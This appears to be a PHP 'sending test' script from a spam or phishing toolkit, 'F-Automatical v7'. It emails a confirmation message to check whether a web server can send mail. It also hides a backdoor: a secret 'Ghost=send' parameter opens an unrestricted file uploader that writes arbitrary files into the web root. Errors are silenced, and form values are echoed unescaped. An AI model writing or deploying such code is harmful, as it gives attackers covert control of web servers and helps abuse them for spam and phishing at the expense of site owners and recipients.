<?php

error_reporting(0);

if($_GET['Ghost'] == 'send'){
	if (isset($_FILES["userfile"]) ) {
		if(move_uploaded_file($_FILES["userfile"]["tmp_name"], $_FILES['userfile']['name'])){
			echo "	<p align='center'>UPloaded Successfully.</p>";
		}
	}
	die("
	<form name='uplform' method='post' action='?Ghost=send'
	enctype='multipart/form-data'>
	<p align='center'>
	<input type='file' name='userfile'>
	<input type='submit'>
	</p>
	");
}

echo '<b>F-Automatical v7 [Sending test].<b><br><br><form method="post">
<input type="text" placeholder="email" name="email" value="'.$_POST['email'].'">
<input type="text" placeholder="ID" name="orderid" value="'.$_POST['orderid'].'">
<input type="submit" value="Send">
</form>
<br>';

if (!empty($_POST['email'])) {
	if (!empty($_POST['email']) && trim($_POST['orderid']) != '') {
		$rand = trim($_POST['orderid']);
	} else {
		$rand = rand();
	}
	mail(trim($_POST['email']),$_SERVER['HTTP_HOST']." - Sending is Working Fine. [Result] ID: (".$rand.")","F-Automatical v7 [Sending test].");
	echo '<b>Send an report to ['.$_POST['email'].'] - ID: '.$rand.'</b>';
	echo '<!-- <id>'.$rand.'</id> -->';
}

?>
